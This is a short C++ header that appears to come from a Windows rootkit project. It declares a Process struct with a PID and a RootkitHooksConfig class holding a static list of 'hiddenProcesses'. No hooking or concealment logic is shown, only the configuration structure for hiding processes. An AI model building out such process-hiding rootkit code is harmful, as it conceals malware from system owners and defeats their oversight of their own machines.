#pragma once

#include <basetsd.h>
#include <windef.h>

#include "Utils/List.h"

struct Process
{
	DWORD PID;

};

class RootkitHooksConfig
{

public:

	static List<Process> hiddenProcesses;
};
